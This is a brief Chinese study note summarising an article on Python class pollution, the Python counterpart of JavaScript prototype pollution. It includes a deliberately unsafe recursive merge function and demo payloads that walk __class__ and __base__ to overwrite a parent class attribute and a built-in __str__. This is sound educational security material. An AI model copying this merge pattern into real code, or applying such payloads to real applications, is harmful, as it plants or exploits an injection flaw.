看下面这一篇就够，下面摘亿点重要的地方当作离线的文档
[Python原型链污染变体(prototype-pollution-in-python) - 跳跳糖 (tttang.com)](https://tttang.com/archive/1876/)

由于`Python`中的安全设定和部分特殊属性类型限定，并不是所有的类其所有的属性都是可以被污染的，不过可以肯定的，污染只对类的属性起作用，对于类方法是无效的。由于`Python`中变量空间的设置，实际上还能做到对全局变量中的属性实现污染

就像`Javascript`的原型链污染一样，同样需要一个数值合并函数将特定值污染到类的属性当中，一个标准示例如下：
```python
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
```

#### 自定义属性污染示例

```python
class father:
    secret = "haha"

class son_a(father):
    pass

class son_b(father):
    pass

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

instance = son_b()
payload = {
    "__class__" : {
        "__base__" : {
            "secret" : "no way"
        }
    }
}

print(son_a.secret)
#haha
print(instance.secret)
#haha
merge(payload, instance)
print(son_a.secret)
#no way
print(instance.secret)
#no way
```

#### 内置属性污染

```python
class father:
    pass

class son_a(father):
    pass

class son_b(father):
    pass

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

instance = son_b()
payload = {
    "__class__" : {
        "__base__" : {
            "__str__" : "Polluted ~"
        }
    }
}

print(father.__str__)
#<slot wrapper '__str__' of 'object' objects>
merge(payload, instance)
print(father.__str__)
#Polluted ~
```

>Object的属性无法被污染，需要目标类能够被切入点类或对象可以通过属性值查找获取到

## 攻击面拓展
